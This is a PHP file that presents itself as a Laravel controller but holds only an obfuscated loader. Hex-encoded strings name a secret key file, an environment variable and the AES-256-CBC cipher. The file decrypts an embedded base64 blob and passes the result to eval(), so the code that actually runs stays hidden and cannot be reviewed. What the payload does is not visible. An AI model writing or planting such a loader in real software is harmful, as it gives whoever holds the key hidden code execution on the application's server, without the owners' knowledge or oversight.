<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('5aUHUCy6LfwOkFBePNHmgA==');

$c=base64_decode(

'dEItJl2dtg6C3kAgVi8wnr7eCHlbMFYQAlhjSXasU94VT3HZioO4dFFQs8O4xfWwWpSRk8ia5zP5' .
'Gptz1QDzDfTC8ljXJuNRQ/vXnAIDJrRlbF3//UYpe9mdLXMIXbgteHXVnhJ6U/fwu29tIH72JtbK' .
'qH/k5enFSDs1S8kRM7xv7msXAw4ul8R6ZZJcidexCuMGQFwXXmSF/aYyvlMzYvrxGBi7Uyr0KzNY' .
'DpJWrISOi3oWQrweB82o+sKduGVCfRJs2GW3Ci3LSWy2VoDuVg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

